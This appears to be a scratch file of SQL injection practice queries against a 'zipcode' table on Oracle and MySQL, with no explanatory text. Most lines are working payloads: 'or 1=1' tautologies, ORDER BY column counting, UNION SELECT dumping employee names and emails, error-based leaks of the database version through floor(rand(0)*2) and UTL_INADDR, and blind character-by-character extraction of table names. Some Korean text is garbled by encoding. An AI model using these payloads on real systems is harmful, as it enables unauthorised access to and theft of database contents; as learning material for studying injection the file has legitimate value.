select * from zipcode where dong like '%1' or 1 = 1 having 1=2--'

select * from zipcode where dong like '%1' or 1 = 1 order by 6--'

select * from zipcode where dong like '%1' or 1 = 1 union select 1,'b','c','d','e','f' from employees --'

select * from zipcode where dong like '%1' or 1 = 1 union select employee_id,first_name,last_name,email,'e','f' from employees order by 3--'

select UTL_INADDR.GET_HOST_NAME((select banner from v$version where rownum=1)) from dual;

select utl_inaddr.get_host_name('127.0.0.1') from dual;

select * from zipcode where dong like '%1' or 1 = 1 union select 1,'a','b','c',(select count(*),concat('result: ',database(),' :',floor(rand(0)*2))as b from information_schema.tables group by b),'d';

select sum(5),concat(version(),floor(rand(0)*2))as a from information_schema.tables group by a;
select sum(5),concat(version(),floor(rand(0)*2))as a from information_schema.tables group by a;

��ó: http://hyunmini.tistory.com/59?category=499903 [Hyunmini]
select sum(5),concat(version(),floor(rand(0)*2)) from information_schema.tables;

SELECT  DBA_ROLES
SELECT test;

select TABLE_NAME from user_tables;
select * from tab;
select SEGMENT_NAME, PARTITION_NAME, BYTES from user_segments where SEGMENT_TYPE='TABLE' order by 1;

SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual;

select count(*),concat('result: ',database(),' :',floor(rand(0)*2))as b from information_schema.tables group by b

SELECT UTL_INADDR.GET_HOST_NAME('pjy') FROM dual;

 SELECT * FROM dba_network_acls;

1' or 1=1 union select 'a','b','c','d','e','f' from employees --
1' or 1=1 union select 'a','b','c','d','e','f','g','h' from employees -- 


select * from zipcode where dong like '%' and 1=0 -- 

select * from zipcode where dong like '%â��%' and 1 =2 --%'


select * from tab;

select ascii('a') from dual;

select rownum,TABLE_NAME from user_tables;

select TABLE_NAME from (select rownum as rnum,TABLE_NAME from user_tables) where rnum=2;

select substr((select TABLE_NAME from (select rownum as rnum,TABLE_NAME from user_tables) where rnum=2),1,1) from dual;

select ascii((select substr((select TABLE_NAME from (select rownum as rnum,TABLE_NAME from user_tables) where rnum=2),1,1) from dual)) from dual;

â��%' and (select ascii((select substr((select TABLE_NAME from (select rownum as rnum,TABLE_NAME from user_tables) where rnum=2),1,1) from dual)) from dual)>66 --

select * from zipcode where dong like '%â��%' and (select ascii((select substr((select TABLE_NAME from (select rownum as rnum,TABLE_NAME from user_tables) where rnum=2),1,1) from dual)) from dual)>66 --%'

select * from zipcode where dong like '%â��%' and (select ascii((select substr((select TABLE_NAME from (select rownum as rnum,TABLE_NAME from user_tables) where rnum=2),1,1) from dual)) from dual)>128 --%'






select dbms_random.string('X', 4) str from dual;










